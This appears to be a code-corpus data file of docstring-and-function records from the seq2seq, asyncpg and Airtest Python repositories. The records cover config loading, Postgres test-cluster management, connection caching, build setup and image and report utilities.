{"docstring": "\"\"\"Reads a file that specifies a mapping from source to target tokens.\nThe file must contain lines of the form <source>\\t<target>\"\n\nArgs:\n  filename: path to the mapping file\n\nReturns:\n  A dictionary that maps from source -> target tokens.\n\"\"\"\n", "func_signal": "def _get_unk_mapping(filename):\n", "code": "with gfile.GFile(filename, \"r\") as mapping_file:\n  lines = mapping_file.readlines()\n  mapping = dict([_.split(\"\\t\")[0:2] for _ in lines])\n  mapping = {k.strip(): v.strip() for k, v in mapping.items()}\nreturn mapping", "path": "seq2seq/seq2seq/tasks/decode_text.py", "commit_date": "2017-03-16 00:00:00", "repo_name": "google/seq2seq", "stars": 5590, "license": "apache-2.0", "language": "python", "size": 1666}
{"docstring": "\"\"\"Creates an InputPipeline object from a dictionary definition.\n\nArgs:\n  def_dict: A dictionary defining the input pipeline.\n    It must have \"class\" and \"params\" that correspond to the class\n    name and constructor parameters of an InputPipeline, respectively.\n  mode: A value in tf.contrib.learn.ModeKeys\n\nReturns:\n  A new InputPipeline object\n\"\"\"\n", "func_signal": "def make_input_pipeline_from_def(def_dict, mode, **kwargs):\n", "code": "if not \"class\" in def_dict:\n  raise ValueError(\"Input Pipeline definition must have a class property.\")\n\nclass_ = def_dict[\"class\"]\nif not hasattr(sys.modules[__name__], class_):\n  raise ValueError(\"Invalid Input Pipeline class: {}\".format(class_))\n\npipeline_class = getattr(sys.modules[__name__], class_)\n\n# Constructor arguments\nparams = {}\nif \"params\" in def_dict:\n  params.update(def_dict[\"params\"])\nparams.update(kwargs)\n\nreturn pipeline_class(params=params, mode=mode)", "path": "seq2seq/seq2seq/data/input_pipeline.py", "commit_date": "2017-03-16 00:00:00", "repo_name": "google/seq2seq", "stars": 5590, "license": "apache-2.0", "language": "python", "size": 1666}
{"docstring": "\"\"\"Gets a dictionary from a graph collection.\n\nArgs:\n  collection_name: A collection name to read a dictionary from\n\nReturns:\n  A dictionary with string keys and tensor values\n\"\"\"\n", "func_signal": "def get_dict_from_collection(collection_name):\n", "code": "key_collection = collection_name + \"_keys\"\nvalue_collection = collection_name + \"_values\"\nkeys = tf.get_collection(key_collection)\nvalues = tf.get_collection(value_collection)\nreturn dict(zip(keys, values))", "path": "seq2seq/seq2seq/graph_utils.py", "commit_date": "2017-04-05 00:00:00", "repo_name": "google/seq2seq", "stars": 5590, "license": "apache-2.0", "language": "python", "size": 1666}
{"docstring": "\"\"\"Resets Tensorflow's FLAG values\"\"\"\n#pylint: disable=W0212\n", "func_signal": "def _clear_flags():\n", "code": "tf.app.flags.FLAGS = tf.app.flags._FlagValues()\ntf.app.flags._global_parser = argparse.ArgumentParser()", "path": "seq2seq/seq2seq/test/pipeline_test.py", "commit_date": "2017-03-29 00:00:00", "repo_name": "google/seq2seq", "stars": 5590, "license": "apache-2.0", "language": "python", "size": 1666}
{"docstring": "\"\"\"Model-specific preprocessing for features and labels:\n\n- Creates vocabulary lookup tables for target vocab\n- Converts tokens into vocabulary ids\n- Prepends a speical \"SEQUENCE_START\" token to the target\n- Appends a speical \"SEQUENCE_END\" token to the target\n\"\"\"\n\n# Create vocabulary look for target\n", "func_signal": "def _preprocess(self, features, labels):\n", "code": "target_vocab_to_id, target_id_to_vocab, target_word_to_count, _ = \\\n  vocab.create_vocabulary_lookup_table(self.target_vocab_info.path)\n\n# Add vocab tables to graph colection so that we can access them in\n# other places.\ngraph_utils.add_dict_to_collection({\n    \"target_vocab_to_id\": target_vocab_to_id,\n    \"target_id_to_vocab\": target_id_to_vocab,\n    \"target_word_to_count\": target_word_to_count\n}, \"vocab_tables\")\n\nif labels is None:\n  return features, None\n\nlabels = labels.copy()\n\n# Slices targets to max length\nif self.params[\"target.max_seq_len\"] is not None:\n  labels[\"target_tokens\"] = labels[\"target_tokens\"][:, :self.params[\n      \"target.max_seq_len\"]]\n  labels[\"target_len\"] = tf.minimum(labels[\"target_len\"],\n                                    self.params[\"target.max_seq_len\"])\n\n# Look up the target ids in the vocabulary\nlabels[\"target_ids\"] = target_vocab_to_id.lookup(labels[\"target_tokens\"])\n\nlabels[\"target_len\"] = tf.to_int32(labels[\"target_len\"])\ntf.summary.histogram(\"target_len\", tf.to_float(labels[\"target_len\"]))\n\n# Add to graph collection for later use\ngraph_utils.add_dict_to_collection(features, \"features\")\nif labels:\n  graph_utils.add_dict_to_collection(labels, \"labels\")\n\nreturn features, labels", "path": "seq2seq/seq2seq/models/image2seq.py", "commit_date": "2017-03-16 00:00:00", "repo_name": "google/seq2seq", "stars": 5590, "license": "apache-2.0", "language": "python", "size": 1666}
{"docstring": "\"\"\"The entrypoint for the script\"\"\"\n\n# Parse YAML FLAGS\n", "func_signal": "def main(_argv):\n", "code": "FLAGS.hooks = _maybe_load_yaml(FLAGS.hooks)\nFLAGS.metrics = _maybe_load_yaml(FLAGS.metrics)\nFLAGS.model_params = _maybe_load_yaml(FLAGS.model_params)\nFLAGS.input_pipeline_train = _maybe_load_yaml(FLAGS.input_pipeline_train)\nFLAGS.input_pipeline_dev = _maybe_load_yaml(FLAGS.input_pipeline_dev)\n\n# Load flags from config file\nfinal_config = {}\nif FLAGS.config_paths:\n  for config_path in FLAGS.config_paths.split(\",\"):\n    config_path = config_path.strip()\n    if not config_path:\n      continue\n    config_path = os.path.abspath(config_path)\n    tf.logging.info(\"Loading config from %s\", config_path)\n    with gfile.GFile(config_path.strip()) as config_file:\n      config_flags = yaml.load(config_file)\n      final_config = _deep_merge_dict(final_config, config_flags)\n\ntf.logging.info(\"Final Config:\\n%s\", yaml.dump(final_config))\n\n# Merge flags with config values\nfor flag_key, flag_value in final_config.items():\n  if hasattr(FLAGS, flag_key) and isinstance(getattr(FLAGS, flag_key), dict):\n    merged_value = _deep_merge_dict(flag_value, getattr(FLAGS, flag_key))\n    setattr(FLAGS, flag_key, merged_value)\n  elif hasattr(FLAGS, flag_key):\n    setattr(FLAGS, flag_key, flag_value)\n  else:\n    tf.logging.warning(\"Ignoring config flag: %s\", flag_key)\n\nif FLAGS.save_checkpoints_secs is None \\\n  and FLAGS.save_checkpoints_steps is None:\n  FLAGS.save_checkpoints_secs = 600\n  tf.logging.info(\"Setting save_checkpoints_secs to %d\",\n                  FLAGS.save_checkpoints_secs)\n\nif not FLAGS.output_dir:\n  FLAGS.output_dir = tempfile.mkdtemp()\n\nif not FLAGS.input_pipeline_train:\n  raise ValueError(\"You must specify input_pipeline_train\")\n\nif not FLAGS.input_pipeline_dev:\n  raise ValueError(\"You must specify input_pipeline_dev\")\n\nlearn_runner.run(\n    experiment_fn=create_experiment,\n    output_dir=FLAGS.output_dir,\n    schedule=FLAGS.schedule)", "path": "seq2seq/bin/train.py", "commit_date": "2017-04-17 00:00:00", "repo_name": "google/seq2seq", "stars": 5590, "license": "apache-2.0", "language": "python", "size": 1666}
{"docstring": "\"\"\"Reload server configuration.\"\"\"\n", "func_signal": "def reload(self):\n", "code": "status = self.get_status()\nif status != 'running':\n    raise ClusterError('cannot reload: cluster is not running')\n\nprocess = subprocess.run(\n    [self._pg_ctl, 'reload', '-D', self._data_dir],\n    stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n\nstderr = process.stderr\n\nif process.returncode != 0:\n    raise ClusterError(\n        'pg_ctl stop exited with status {:d}: {}'.format(\n            process.returncode, stderr.decode()))", "path": "asyncpg/asyncpg/cluster.py", "commit_date": "2020-11-29 00:00:00", "repo_name": "MagicStack/asyncpg", "stars": 6517, "license": "apache-2.0", "language": "python", "size": 10988}
{"docstring": "# finalize_options() may be called multiple times on the\n# same command object, so make sure not to override previously\n# set options.\n", "func_signal": "def finalize_options(self):\n", "code": "if getattr(self, '_initialized', False):\n    return\n\nneed_cythonize = self.cython_always\ncfiles = {}\n\nfor extension in self.distribution.ext_modules:\n    for i, sfile in enumerate(extension.sources):\n        if sfile.endswith('.pyx'):\n            prefix, ext = os.path.splitext(sfile)\n            cfile = prefix + '.c'\n\n            if os.path.exists(cfile) and not self.cython_always:\n                extension.sources[i] = cfile\n            else:\n                if os.path.exists(cfile):\n                    cfiles[cfile] = os.path.getmtime(cfile)\n                else:\n                    cfiles[cfile] = 0\n                need_cythonize = True\n\nif need_cythonize:\n    import pkg_resources\n\n    # Double check Cython presence in case setup_requires\n    # didn't go into effect (most likely because someone\n    # imported Cython before setup_requires injected the\n    # correct egg into sys.path.\n    try:\n        import Cython\n    except ImportError:\n        raise RuntimeError(\n            'please install {} to compile asyncpg from source'.format(\n                CYTHON_DEPENDENCY))\n\n    cython_dep = pkg_resources.Requirement.parse(CYTHON_DEPENDENCY)\n    if Cython.__version__ not in cython_dep:\n        raise RuntimeError(\n            'asyncpg requires {}, got Cython=={}'.format(\n                CYTHON_DEPENDENCY, Cython.__version__\n            ))\n\n    from Cython.Build import cythonize\n\n    directives = {\n        'language_level': '3',\n    }\n\n    if self.cython_directives:\n        for directive in self.cython_directives.split(','):\n            k, _, v = directive.partition('=')\n            if v.lower() == 'false':\n                v = False\n            if v.lower() == 'true':\n                v = True\n\n            directives[k] = v\n\n    self.distribution.ext_modules[:] = cythonize(\n        self.distribution.ext_modules,\n        compiler_directives=directives,\n        annotate=self.cython_annotate)\n\nsuper(build_ext, self).finalize_options()", "path": "asyncpg/setup.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "MagicStack/asyncpg", "stars": 6517, "license": "apache-2.0", "language": "python", "size": 10988}
{"docstring": "# initialize_options() may be called multiple times on the\n# same command object, so make sure not to override previously\n# set options.\n", "func_signal": "def initialize_options(self):\n", "code": "if getattr(self, '_initialized', False):\n    return\n\nsuper(build_ext, self).initialize_options()\n\nif os.environ.get('ASYNCPG_DEBUG'):\n    self.cython_always = True\n    self.cython_annotate = True\n    self.cython_directives = \"linetrace=True\"\n    self.define = 'PG_DEBUG,CYTHON_TRACE,CYTHON_TRACE_NOGIL'\n    self.debug = True\nelse:\n    self.cython_always = False\n    self.cython_annotate = None\n    self.cython_directives = None", "path": "asyncpg/setup.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "MagicStack/asyncpg", "stars": 6517, "license": "apache-2.0", "language": "python", "size": 10988}
{"docstring": "# Put the connection into the aborted state.\n", "func_signal": "def _abort(self):\n", "code": "self._aborted = True\nself._protocol.abort()\nself._protocol = None", "path": "asyncpg/asyncpg/connection.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "MagicStack/asyncpg", "stars": 6517, "license": "apache-2.0", "language": "python", "size": 10988}
{"docstring": "\"\"\"Replacement for traceback.extract_stack() that only does the\nnecessary work for asyncio debug mode.\n\"\"\"\n", "func_signal": "def _extract_stack(limit=10):\n", "code": "frame = sys._getframe().f_back\ntry:\n    stack = traceback.StackSummary.extract(\n        traceback.walk_stack(frame), lookup_lines=False)\nfinally:\n    del frame\n\napg_path = asyncpg.__path__[0]\ni = 0\nwhile i < len(stack) and stack[i][0].startswith(apg_path):\n    i += 1\nstack = stack[i:i + limit]\n\nstack.reverse()\nreturn ''.join(traceback.format_list(stack))", "path": "asyncpg/asyncpg/connection.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "MagicStack/asyncpg", "stars": 6517, "license": "apache-2.0", "language": "python", "size": 10988}
{"docstring": "\"\"\"Add a listener for Postgres log messages.\n\nIt will be called when asyncronous NoticeResponse is received\nfrom the connection.  Possible message types are: WARNING, NOTICE,\nDEBUG, INFO, or LOG.\n\n:param callable callback:\n    A callable receiving the following arguments:\n    **connection**: a Connection the callback is registered with;\n    **message**: the `exceptions.PostgresLogMessage` message.\n\n.. versionadded:: 0.12.0\n\"\"\"\n", "func_signal": "def add_log_listener(self, callback):\n", "code": "if self.is_closed():\n    raise exceptions.InterfaceError('connection is closed')\nself._log_listeners.add(callback)", "path": "asyncpg/asyncpg/connection.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "MagicStack/asyncpg", "stars": 6517, "license": "apache-2.0", "language": "python", "size": 10988}
{"docstring": "\"\"\"Initialize cluster.\"\"\"\n", "func_signal": "def init(self, **settings):\n", "code": "if self.get_status() != 'not-initialized':\n    raise ClusterError(\n        'cluster in {!r} has already been initialized'.format(\n            self._data_dir))\n\nsettings = dict(settings)\nif 'encoding' not in settings:\n    settings['encoding'] = 'UTF-8'\n\nif settings:\n    settings_args = ['--{}={}'.format(k, v)\n                     for k, v in settings.items()]\n    extra_args = ['-o'] + [' '.join(settings_args)]\nelse:\n    extra_args = []\n\nprocess = subprocess.run(\n    [self._pg_ctl, 'init', '-D', self._data_dir] + extra_args,\n    stdout=subprocess.PIPE, stderr=subprocess.STDOUT)\n\noutput = process.stdout\n\nif process.returncode != 0:\n    raise ClusterError(\n        'pg_ctl init exited with status {:d}:\\n{}'.format(\n            process.returncode, output.decode()))\n\nreturn output.decode()", "path": "asyncpg/asyncpg/cluster.py", "commit_date": "2020-11-29 00:00:00", "repo_name": "MagicStack/asyncpg", "stars": 6517, "license": "apache-2.0", "language": "python", "size": 10988}
{"docstring": "\"\"\"Terminate the connection without waiting for pending data.\"\"\"\n", "func_signal": "def terminate(self):\n", "code": "if not self.is_closed():\n    self._abort()\nself._cleanup()", "path": "asyncpg/asyncpg/connection.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "MagicStack/asyncpg", "stars": 6517, "license": "apache-2.0", "language": "python", "size": 10988}
{"docstring": "\"\"\"Remove all records from pg_hba.conf.\"\"\"\n", "func_signal": "def reset_hba(self):\n", "code": "status = self.get_status()\nif status == 'not-initialized':\n    raise ClusterError(\n        'cannot modify HBA records: cluster is not initialized')\n\npg_hba = os.path.join(self._data_dir, 'pg_hba.conf')\n\ntry:\n    with open(pg_hba, 'w'):\n        pass\nexcept IOError as e:\n    raise ClusterError(\n        'cannot modify HBA records: {}'.format(e)) from e", "path": "asyncpg/asyncpg/cluster.py", "commit_date": "2020-11-29 00:00:00", "repo_name": "MagicStack/asyncpg", "stars": 6517, "license": "apache-2.0", "language": "python", "size": 10988}
{"docstring": "# Reset cluster's pg_hba.conf since we've meddled with it\n", "func_signal": "def tearDown(self):\n", "code": "self.cluster.trust_local_connections()\n\ndrop_script = []\ndrop_script.append('DROP ROLE ssl_user;')\ndrop_script = '\\n'.join(drop_script)\nself.loop.run_until_complete(self.con.execute(drop_script))\n\nsuper().tearDown()", "path": "asyncpg/tests/test_connect.py", "commit_date": "2020-11-29 00:00:00", "repo_name": "MagicStack/asyncpg", "stars": 6517, "license": "apache-2.0", "language": "python", "size": 10988}
{"docstring": "# `call_later` callback, called when an entry stayed longer\n# than `self._max_lifetime`.\n", "func_signal": "def _on_entry_expired(self, entry):\n", "code": "if self._entries.get(entry._query) is entry:\n    self._entries.pop(entry._query)\n    self._on_remove(entry._statement)", "path": "asyncpg/asyncpg/connection.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "MagicStack/asyncpg", "stars": 6517, "license": "apache-2.0", "language": "python", "size": 10988}
{"docstring": "# Replace asyncpg.__version__ with the actual version\n# of the distribution (possibly inferred from git).\n\n", "func_signal": "def _fix_version(self, filename):\n", "code": "with open(str(filename)) as f:\n    content = f.read()\n\nversion_re = r\"(.*__version__\\s*=\\s*)'[^']+'(.*)\"\nrepl = r\"\\1'{}'\\2\".format(self.distribution.metadata.version)\ncontent = re.sub(version_re, repl, content)\n\nwith open(str(filename), 'w') as f:\n    f.write(content)", "path": "asyncpg/setup.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "MagicStack/asyncpg", "stars": 6517, "license": "apache-2.0", "language": "python", "size": 10988}
{"docstring": "# Invalidate external references to the connection.\n", "func_signal": "def _on_release(self, stacklevel=1):\n", "code": "self._pool_release_ctr += 1\n# Called when the connection is about to be released to the pool.\n# Let's check that the user has not left any listeners on it.\nself._check_listeners(\n    list(itertools.chain.from_iterable(self._listeners.values())),\n    'notification')\nself._check_listeners(\n    self._log_listeners, 'log')", "path": "asyncpg/asyncpg/connection.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "MagicStack/asyncpg", "stars": 6517, "license": "apache-2.0", "language": "python", "size": 10988}
{"docstring": "# Verify that .pgpass permissions are checked\n", "func_signal": "def test_connect_pgpass_badness_mode(self):\n", "code": "with tempfile.NamedTemporaryFile('w+t') as passfile:\n    os.chmod(passfile.name,\n             stat.S_IWUSR | stat.S_IRUSR | stat.S_IWGRP | stat.S_IRGRP)\n\n    with self.assertWarnsRegex(\n            UserWarning,\n            'password file .* has group or world access'):\n        self.run_testcase({\n            'host': 'abc',\n            'user': 'user',\n            'database': 'db',\n            'passfile': passfile.name,\n            'result': (\n                [('abc', 5432)],\n                {\n                    'user': 'user',\n                    'database': 'db',\n                }\n            )\n        })", "path": "asyncpg/tests/test_connect.py", "commit_date": "2020-11-29 00:00:00", "repo_name": "MagicStack/asyncpg", "stars": 6517, "license": "apache-2.0", "language": "python", "size": 10988}
{"docstring": "# Store entries for later.\n", "func_signal": "def clear(self):\n", "code": "entries = tuple(self._entries.values())\n\n# Clear the entries dict.\nself._entries.clear()\n\n# Make sure that we cancel all scheduled callbacks\n# and call on_remove callback for each entry.\nfor entry in entries:\n    self._clear_entry_callback(entry)\n    self._on_remove(entry._statement)", "path": "asyncpg/asyncpg/connection.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "MagicStack/asyncpg", "stars": 6517, "license": "apache-2.0", "language": "python", "size": 10988}
{"docstring": "# Delete cache entries until the size of the cache is `max_size`.\n", "func_signal": "def _maybe_cleanup(self):\n", "code": "while len(self._entries) > self._max_size:\n    old_query, old_entry = self._entries.popitem(last=False)\n    self._clear_entry_callback(old_entry)\n\n    # Let the connection know that the statement was removed\n    # from the cache.\n    self._on_remove(old_entry._statement)", "path": "asyncpg/asyncpg/connection.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "MagicStack/asyncpg", "stars": 6517, "license": "apache-2.0", "language": "python", "size": 10988}
{"docstring": "\"\"\"Initialize cluster.\"\"\"\n", "func_signal": "def init(self, **settings):\n", "code": "if self.get_status() != 'not-initialized':\n    raise ClusterError(\n        'cluster in {!r} has already been initialized'.format(\n            self._data_dir))\n\nprocess = subprocess.run(\n    [self._pg_basebackup, '-h', self._master['host'],\n     '-p', self._master['port'], '-D', self._data_dir,\n     '-U', self._repl_user],\n    stdout=subprocess.PIPE, stderr=subprocess.STDOUT)\n\noutput = process.stdout\n\nif process.returncode != 0:\n    raise ClusterError(\n        'pg_basebackup init exited with status {:d}:\\n{}'.format(\n            process.returncode, output.decode()))\n\nif self._pg_version <= (11, 0):\n    with open(os.path.join(self._data_dir, 'recovery.conf'), 'w') as f:\n        f.write(textwrap.dedent(\"\"\"\\\n            standby_mode = 'on'\n            primary_conninfo = 'host={host} port={port} user={user}'\n        \"\"\".format(\n            host=self._master['host'],\n            port=self._master['port'],\n            user=self._repl_user)))\nelse:\n    f = open(os.path.join(self._data_dir, 'standby.signal'), 'w')\n    f.close()\n\nreturn output.decode()", "path": "asyncpg/asyncpg/cluster.py", "commit_date": "2020-11-29 00:00:00", "repo_name": "MagicStack/asyncpg", "stars": 6517, "license": "apache-2.0", "language": "python", "size": 10988}
{"docstring": "# Wrap-up any remaining tasks associated with this connection.\n", "func_signal": "def _clean_tasks(self):\n", "code": "if self._cancellations:\n    for fut in self._cancellations:\n        if not fut.done():\n            fut.cancel()\n    self._cancellations.clear()", "path": "asyncpg/asyncpg/connection.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "MagicStack/asyncpg", "stars": 6517, "license": "apache-2.0", "language": "python", "size": 10988}
{"docstring": "# nonexistent passfile is OK\n", "func_signal": "def test_connect_pgpass_nonexistent(self):\n", "code": "self.run_testcase({\n    'host': 'abc',\n    'user': 'user',\n    'database': 'db',\n    'passfile': 'totally nonexistent',\n    'result': (\n        [('abc', 5432)],\n        {\n            'user': 'user',\n            'database': 'db',\n        }\n    )\n})", "path": "asyncpg/tests/test_connect.py", "commit_date": "2020-11-29 00:00:00", "repo_name": "MagicStack/asyncpg", "stars": 6517, "license": "apache-2.0", "language": "python", "size": 10988}
{"docstring": "\"\"\"Start the cluster.\"\"\"\n", "func_signal": "def start(self, wait=60, *, server_settings={}, **opts):\n", "code": "status = self.get_status()\nif status == 'running':\n    return\nelif status == 'not-initialized':\n    raise ClusterError(\n        'cluster in {!r} has not been initialized'.format(\n            self._data_dir))\n\nport = opts.pop('port', None)\nif port == 'dynamic':\n    port = find_available_port()\n\nextra_args = ['--{}={}'.format(k, v) for k, v in opts.items()]\nextra_args.append('--port={}'.format(port))\n\nsockdir = server_settings.get('unix_socket_directories')\nif sockdir is None:\n    sockdir = server_settings.get('unix_socket_directory')\nif sockdir is None and _system != 'Windows':\n    sockdir = tempfile.gettempdir()\n\nssl_key = server_settings.get('ssl_key_file')\nif ssl_key:\n    # Make sure server certificate key file has correct permissions.\n    keyfile = os.path.join(self._data_dir, 'srvkey.pem')\n    shutil.copy(ssl_key, keyfile)\n    os.chmod(keyfile, 0o600)\n    server_settings = server_settings.copy()\n    server_settings['ssl_key_file'] = keyfile\n\nif sockdir is not None:\n    if self._pg_version < (9, 3):\n        sockdir_opt = 'unix_socket_directory'\n    else:\n        sockdir_opt = 'unix_socket_directories'\n\n    server_settings[sockdir_opt] = sockdir\n\nfor k, v in server_settings.items():\n    extra_args.extend(['-c', '{}={}'.format(k, v)])\n\nif _system == 'Windows':\n    # On Windows we have to use pg_ctl as direct execution\n    # of postgres daemon under an Administrative account\n    # is not permitted and there is no easy way to drop\n    # privileges.\n    if os.getenv('ASYNCPG_DEBUG_SERVER'):\n        stdout = sys.stdout\n        print(\n            'asyncpg.cluster: Running',\n            ' '.join([\n                self._pg_ctl, 'start', '-D', self._data_dir,\n                '-o', ' '.join(extra_args)\n            ]),\n            file=sys.stderr,\n        )\n    else:\n        stdout = subprocess.DEVNULL\n\n    process = subprocess.run(\n        [self._pg_ctl, 'start', '-D', self._data_dir,\n         '-o', ' '.join(extra_args)],\n        stdout=stdout, stderr=subprocess.STDOUT)\n\n    if process.returncode != 0:\n        if process.stderr:\n            stderr = ':\\n{}'.format(process.stderr.decode())\n        else:\n            stderr = ''\n        raise ClusterError(\n            'pg_ctl start exited with status {:d}{}'.format(\n                process.returncode, stderr))\nelse:\n    if os.getenv('ASYNCPG_DEBUG_SERVER'):\n        stdout = sys.stdout\n    else:\n        stdout = subprocess.DEVNULL\n\n    self._daemon_process = \\\n        subprocess.Popen(\n            [self._postgres, '-D', self._data_dir, *extra_args],\n            stdout=stdout, stderr=subprocess.STDOUT)\n\n    self._daemon_pid = self._daemon_process.pid\n\nself._test_connection(timeout=wait)", "path": "asyncpg/asyncpg/cluster.py", "commit_date": "2020-11-29 00:00:00", "repo_name": "MagicStack/asyncpg", "stars": 6517, "license": "apache-2.0", "language": "python", "size": 10988}
{"docstring": "\"\"\"\n    \u533a\u57df\u622a\u56fe\uff0c\u540c\u65f6\u8fd4\u56de\u622a\u53d6\u7ed3\u679c \u548c \u622a\u53d6\u504f\u79fb;\n    Crop image , rect = [x_min, y_min, x_max ,y_max].\n    (airtest\u4e2d\u6709\u7528\u5230)\n\"\"\"\n\n", "func_signal": "def crop_image(img, rect):\n", "code": "if isinstance(rect, (list, tuple)) and len(rect) == 4:\n    height, width = img.shape[:2]\n    # \u83b7\u53d6\u5728\u56fe\u50cf\u4e2d\u7684\u5b9e\u9645\u6709\u6548\u533a\u57df\uff1a\n    x_min, y_min, x_max, y_max = [int(i) for i in rect]\n    x_min, y_min = max(0, x_min), max(0, y_min)\n    x_min, y_min = min(width - 1, x_min), min(height - 1, y_min)\n    x_max, y_max = max(0, x_max), max(0, y_max)\n    x_max, y_max = min(width - 1, x_max), min(height - 1, y_max)\n\n    # \u8fd4\u56de\u526a\u5207\u7684\u6709\u6548\u56fe\u50cf+\u5de6\u4e0a\u89d2\u7684\u504f\u79fb\u5750\u6807\uff1a\n    img_crop = img[y_min:y_max, x_min:x_max]\n    return img_crop\nelse:\n    raise Exception(\"to crop a image, rect should be a list like: [x_min, y_min, x_max, y_max].\")", "path": "Airtest/airtest/aircv/aircv.py", "commit_date": "2020-09-24 00:00:00", "repo_name": "AirtestProject/Airtest", "stars": 7730, "license": "apache-2.0", "language": "python", "size": 214272}
{"docstring": "\"\"\"\u539f\u59cb\u5c3a\u5bf8\u7a97\u53e3\u4e2d\u663e\u793a\u56fe\u7247.\"\"\"\n", "func_signal": "def show_origin_size(img, title=\"image\", test_flag=False):\n", "code": "cv2.imshow(title, img)\nif not test_flag:\n    cv2.waitKey(0)\ncv2.destroyAllWindows()", "path": "Airtest/airtest/aircv/aircv.py", "commit_date": "2020-09-24 00:00:00", "repo_name": "AirtestProject/Airtest", "stars": 7730, "license": "apache-2.0", "language": "python", "size": 214272}
{"docstring": "\"\"\"\nGenerate the report page, you can add custom data and overload it if needed\n:param template_name: default is HTML_TPL\n:param output_file: The file name or full path of the output file, default HTML_FILE\n:param record_list: List of screen recording files\n:return:\n\"\"\"\n", "func_signal": "def report(self, template_name=HTML_TPL, output_file=None, record_list=None):\n", "code": "if not self.script_name:\n    path, self.script_name = script_dir_name(self.script_root)\n\nif self.export_dir:\n    self.script_root, self.log_root = self._make_export_dir()\n    # output_file\u53ef\u4f20\u5165\u6587\u4ef6\u540d\uff0c\u6216\u7edd\u5bf9\u8def\u5f84\n    output_file = output_file if output_file and os.path.isabs(output_file) \\\n        else os.path.join(self.script_root, output_file or HTML_FILE)\n    if not self.static_root.startswith(\"http\"):\n        self.static_root = \"static/\"\n\nif not record_list:\n    record_list = [f for f in os.listdir(self.log_root) if f.endswith(\".mp4\")]\ndata = self.report_data(output_file=output_file, record_list=record_list)\nreturn self._render(template_name, output_file, **data)", "path": "Airtest/airtest/report/report.py", "commit_date": "2020-09-25 00:00:00", "repo_name": "AirtestProject/Airtest", "stars": 7730, "license": "apache-2.0", "language": "python", "size": 214272}
{"docstring": "\"\"\" \u8c03\u8bd5\u7528\u7684: \u6807\u8bb0\u4e00\u4e2a\u70b9 \"\"\"\n", "func_signal": "def mark_point(img, point, circle=False, color=100, radius=20):\n", "code": "x, y = point\n# cv2.rectangle(img, (x, y), (x+10, y+10), 255, 1, lineType=cv2.CV_AA)\nif circle:\n    cv2.circle(img, (x, y), radius, 255, thickness=2)\ncv2.line(img, (x - radius, y), (x + radius, y), color)  # x line\ncv2.line(img, (x, y - radius), (x, y + radius), color)  # y line\nreturn img", "path": "Airtest/airtest/aircv/aircv.py", "commit_date": "2020-09-24 00:00:00", "repo_name": "AirtestProject/Airtest", "stars": 7730, "license": "apache-2.0", "language": "python", "size": 214272}
{"docstring": "\"\"\"\nTry to get the relative path of log.txt\n:param output_file: output file: log.html\n:return: ./log.txt or \"\"\n\"\"\"\n", "func_signal": "def get_relative_log(self, output_file):\n", "code": "try:\n    html_dir = os.path.dirname(output_file)\n    return os.path.relpath(os.path.join(self.log_root, 'log.txt'), html_dir)\nexcept:\n    LOGGING.error(traceback.format_exc())\n    return \"\"", "path": "Airtest/airtest/report/report.py", "commit_date": "2020-09-25 00:00:00", "repo_name": "AirtestProject/Airtest", "stars": 7730, "license": "apache-2.0", "language": "python", "size": 214272}
{"docstring": "\"\"\"mkdir & copy /staticfiles/screenshots\"\"\"\n# let dirname = <script name>.log\n", "func_signal": "def _make_export_dir(self):\n", "code": "dirname = self.script_name.replace(os.path.splitext(self.script_name)[1], \".log\")\n# mkdir\ndirpath = os.path.join(self.export_dir, dirname)\nif os.path.isdir(dirpath):\n    shutil.rmtree(dirpath, ignore_errors=True)\n\n# copy script\ndef ignore_export_dir(dirname, filenames):\n    # \u5ffd\u7565\u5f53\u524d\u5bfc\u51fa\u7684\u76ee\u5f55\uff0c\u9632\u6b62\u9012\u5f52\u5bfc\u51fa\n    if os.path.commonprefix([dirpath, dirname]) == dirpath:\n        return filenames\n    return []\nself.copy_tree(self.script_root, dirpath, ignore=ignore_export_dir)\n# copy log\nlogpath = os.path.join(dirpath, LOGDIR)\nif os.path.normpath(logpath) != os.path.normpath(self.log_root):\n    if os.path.isdir(logpath):\n        shutil.rmtree(logpath, ignore_errors=True)\n    self.copy_tree(self.log_root, logpath, ignore=shutil.ignore_patterns(dirname))\n# if self.static_root is not a http server address, copy static files from local directory\nif not self.static_root.startswith(\"http\"):\n    for subdir in [\"css\", \"fonts\", \"image\", \"js\"]:\n        self.copy_tree(os.path.join(self.static_root, subdir), os.path.join(dirpath, \"static\", subdir))\n\nreturn dirpath, logpath", "path": "Airtest/airtest/report/report.py", "commit_date": "2020-09-25 00:00:00", "repo_name": "AirtestProject/Airtest", "stars": 7730, "license": "apache-2.0", "language": "python", "size": 214272}
{"docstring": "\"\"\"count rect for js use\"\"\"\n", "func_signal": "def div_rect(r):\n", "code": "xs = [p[0] for p in r]\nys = [p[1] for p in r]\nleft = min(xs)\ntop = min(ys)\nw = max(xs) - left\nh = max(ys) - top\nreturn {'left': left, 'top': top, 'width': w, 'height': h}", "path": "Airtest/airtest/report/report.py", "commit_date": "2020-09-25 00:00:00", "repo_name": "AirtestProject/Airtest", "stars": 7730, "license": "apache-2.0", "language": "python", "size": 214272}
